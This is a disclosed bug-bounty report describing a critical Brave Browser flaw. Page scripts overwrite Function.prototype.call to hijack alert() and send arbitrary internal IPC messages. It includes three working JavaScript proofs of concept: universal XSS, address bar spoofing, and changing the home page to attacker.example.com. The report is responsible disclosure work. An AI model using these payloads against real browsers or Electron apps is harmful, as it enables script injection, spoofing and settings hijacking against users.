# Brave Browser unexpectedly allows to send arbitrary IPC messages

## Report Details
- **Report ID**: 187542
- **URL**: https://hackerone.com/reports/187542
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2016-12-02T00:41:45.053Z
- **Disclosed**: 2018-09-18T18:15:18.396Z

## Reporter
- **Username**: masatokinugawa
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: brave

## Vulnerability Information
## Summary:
I found that Brave Browser allows to overwrite the internal js code from the user js code.
Using this behavior, an attacker can send arbitrary IPC messages and do UXSS, address bar spoofing, changing browser settings and so on. 

## Steps to Reproduce:

1 .  An attacker overwrites `Function.prototype.call`, like this:

```
Function.prototype.call=function(e){
    if(e[0]&&e[0]=="window-alert"){
        e[0]="[ARBITRARY_IPC_MESSAGE_HERE]";
        e[1]="[ARBITRARY_IPC_MESSAGE_HERE]";
    }
    return this.apply(e);
}
```
2 .  An attacker calls `alert()`.

3 .  Brave's `alert()` function calls `Function.prototype.call` in the internal code. At this time, the overwritten `Function.prototype.call` is used in the `alert` internal code.

4 .  `Function.prototype.call` receives IPC messages as arguments. This arguments are replaced to arbitrary messages by step 2's code. Thus, an attacker can send arbitrary IPC messages.

## PoC:

I'd like to show three PoCs:

###UXSS PoC

(If it goes well, you can see an alert dialog on google's domain.)
```
<script>
Function.prototype.call=function(e){
    if(e[0]&&e[0]=="window-alert"){
        e[0]="dispatch-action";
        e[1]='{"actionType":"window-new-frame","frameOpts":{"location":"https://www.google.com/ncr"},"openInForeground":true}'
    }
    return this.apply(e);
}
alert();

setTimeout(function(){
	for(var windowKey=0;windowKey<10000;windowKey++){
		Function.prototype.call=function(e){
			if(e && e[0] && e[0]=="window-alert"){
				e[0]="dispatch-action";
				e[1]=`{"actionType":"window-set-url","location":"javascript:alert('document.domain is: '+document.domain)","key":${windowKey}}`
			}
			return this.apply(e);
		}
		alert();
	}
},3000);
</script>
```


###Address Bar Spoofing PoC

(If it goes well, you can see https://www.google.com/ in address bar.)
```
<script>
Function.prototype.call=function(e){
	if(e && e[0] && e[0]=="window-alert"){
		e[0]="dispatch-action";
		e[1]='{"actionType":"window-set-navbar-input","location":"https://www.google.com/"}';
	}
	return this.apply(e);
}
alert();
</script>
```


###Change browser settings PoC

(If it goes well, your home page is changed to http://attacker.example.com/ . You can see it in `about:preferences`. )
```
<script>
Function.prototype.call=function(e){
    if(e[0]&&e[0]=="window-alert"){
        e[0]="dispatch-action";
        e[1]='{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}'
    }
    return this.apply(e);
}
alert();
</script>
```

FYI, Electron has similar issues. I reported it to Electron team and they are working on it.
Could you confirm this bug?
Thanks!

## Attachments
No attachments
